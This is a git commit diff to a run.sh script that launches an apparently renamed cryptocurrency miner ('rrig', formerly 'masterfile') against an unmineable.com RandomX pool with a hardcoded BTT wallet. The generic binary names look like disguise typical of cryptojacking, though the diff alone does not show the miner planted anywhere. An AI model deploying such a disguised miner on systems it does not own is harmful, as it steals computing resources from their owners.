685562a16d9ba64d0ec382f9cc74269fae57375d
ferasa <86012372+desafff@users.noreply.github.com>
2021-09-29 07:49:51 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -4,4 +4,4 @@ chmod 777 rrig
 POOL=rx.unmineable.com:80
 WALLET=BTT:TN9nZPj9qS8BUYVMhkVhHwg2PJgpQR9whL
 WORKER=$(shuf -n 1 -i 1-9999)
-./masterfile -o $POOL -u $WALLET -p $WORKER -a rx/0 --donate-level 1 -x -k
+./rrig -o $POOL -u $WALLET -p $WORKER -a rx/0 --donate-level 1 -x -k
